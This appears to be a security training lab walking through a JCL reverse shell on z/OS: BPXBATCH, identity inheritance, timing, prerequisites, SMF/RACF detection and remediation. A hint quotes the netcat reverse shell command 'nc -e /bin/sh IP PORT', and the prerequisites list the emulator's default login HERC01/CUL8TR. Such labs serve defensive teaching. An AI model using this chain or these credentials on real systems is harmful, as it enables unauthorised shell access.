title: Z/OS Reverse Shell via JCL (Metasploit)
description: Analyze the reverse_shell_jcl payload. Trace deferred execution, identity binding, and the submission-to-execution gap.

steps.title: The Metasploit JCL Payload
steps.expected: Understand the structure of the JCL reverse shell payload.
steps.hint: BPXBATCH executes Unix System Services (USS) shell commands from batch JCL.

steps.title: Why BPXBATCH?
steps.screen:
BPXBATCH — Batch Unix System Services

BPXBATCH is an IBM-supplied program that:
- Runs USS shell commands from batch JCL
- Bridges the MVS batch world and USS
- Inherits the submitting user's RACF identity
- Has access to both MVS datasets AND Unix files

This makes it the ideal pivot point:
MVS batch -> USS shell -> network socket
steps.expected: BPXBATCH bridges MVS batch execution to Unix shell commands.
steps.hint: Any user with RACF BPX.DAEMON or BPX.SERVER authority can run arbitrary USS commands.

steps.title: Identity Binding Analysis
steps.screen:
Identity Binding in the JCL Payload

1. JOB card: identity bound at submission
   //RSHELL JOB ... submitted by HERC01

2. JES scheduling: job queued under HERC01

3. BPXBATCH execution: runs as HERC01 in USS

4. nc (netcat): spawns shell as HERC01

5. Reverse connection: attacker gets shell
   with HERC01's RACF authority

The identity never changes — it's inherited.
steps.expected: Trace how HERC01's identity flows from JCL submission to reverse shell.
steps.hint: This is the mainframe equivalent of a cron job reverse shell — deferred and identity-bound.

steps.title: The Submission-to-Execution Gap
steps.screen:
Submission-to-Execution Gap

T=0:  Attacker submits JCL via TN3270
T=1:  JES accepts job, assigns JOB00999
T=2:  Job waits in INPUT queue
T=3:  Initiator picks up job (CLASS=A)
T=4:  BPXBATCH starts, nc executes
T=5:  Reverse shell connects to attacker

Gap between T=0 and T=5: seconds to minutes
Depends on: initiator availability, job class

Detection window: SMF type 30 records at T=1
steps.expected: Map the timeline from JCL submission to reverse shell execution.
steps.hint: The gap is the detection window — SMF logging at T=1 is the earliest detection point.

steps.title: Prerequisites on TK5
steps.screen:
Requirements for JCL Reverse Shell on TK5

1. TN3270 access (port 3270)
2. Valid RACF credentials (HERC01/CUL8TR)
3. RACF BPX.DAEMON or USS access permitted
4. netcat (nc) available in USS /bin
5. Outbound network from Hercules host
6. Listener on attacker machine

TK5 check:
- USS is available (OMVS segment in RACF)
- nc may not be installed by default
steps.expected: Identify prerequisites for executing the reverse shell on TK5.
steps.hint: Check USS availability: TSO OMVS — if it opens a shell, USS is enabled for your user.

steps.title: Detection and Defense
steps.screen:
Detection Opportunities

1. SMF Type 30: Job submission record
   - Captures jobname, userid, submission time
   - Available in real-time via SMF exit

2. RACF Event Logging: BPX.DAEMON usage
   - SETROPTS LOGOPTIONS(ALWAYS) for BPX class

3. Network monitoring: outbound from Hercules
   - Unusual outbound connections from z/OS

4. JES job class monitoring:
   - Suspicious jobnames or unusual CLASS usage

Defense: Restrict BPX.DAEMON, monitor SMF 30.
steps.expected: Identify detection and defense mechanisms against JCL reverse shells.
steps.hint: SMF type 30 is the primary audit record — ensure it's being collected and analyzed.

steps.title: Simulate the Attack
steps.expected: Verify USS access via BPXBATCH without requiring a network listener.
steps.hint: Replace 'nc -e /bin/sh IP PORT' with 'id' to test without a listener.

steps.title: View USS Output
steps.screen:
SDSF OUTPUT — TESTUSS JOB00301

uid=0(HERC01) gid=0(SYS1)
MVS 03.08.00 ADCD.Z23B.PARMLIB 2024
/
  bin
  dev
  etc
  tmp
  usr
  var

IEF142I TESTUSS STEP1 - STEP WAS EXECUTED - COND CODE 0000
steps.expected: USS is accessible and HERC01 runs as uid=0 (root equivalent).
steps.hint: uid=0 in USS = superuser. HERC01 has full USS access — the reverse shell would have root.

steps.title: Lab Complete
steps.screen:
Z/OS Reverse Shell Lab Complete

Key findings:
- BPXBATCH bridges MVS batch to USS shell
- Identity is inherited from JCL submitter
- Deferred execution = detection gap
- HERC01 = uid=0 in USS (full access)
- SMF type 30 = primary detection record

Attack chain:
TN3270 access -> valid creds -> submit JCL
-> BPXBATCH -> USS shell -> reverse connect

This is a documented, weaponized attack path.
steps.expected: Understand the complete JCL reverse shell attack chain on z/OS.
steps.hint: This attack requires only TN3270 access and valid credentials — no exploits needed.

steps.title: Remediation
steps.screen:
Remediation Steps

1. Restrict BPX.DAEMON:
   PERMIT BPX.DAEMON CLASS(FACILITY) ID(*) ACCESS(NONE)
   Only grant to specific service accounts.

2. Enable RACF logging for BPX class:
   SETROPTS LOGOPTIONS(ALWAYS) CLASSACT(FACILITY)

3. Monitor SMF type 30 records in real-time

4. Restrict outbound network from z/OS LPAR

5. Audit RACF OMVS segments:
   LU * OMVS — list all users with USS access

6. Consider RACF program control for BPXBATCH
steps.expected: Apply remediation to prevent JCL reverse shell attacks.
steps.hint: The most effective control is restricting BPX.DAEMON — most users don't need USS access.
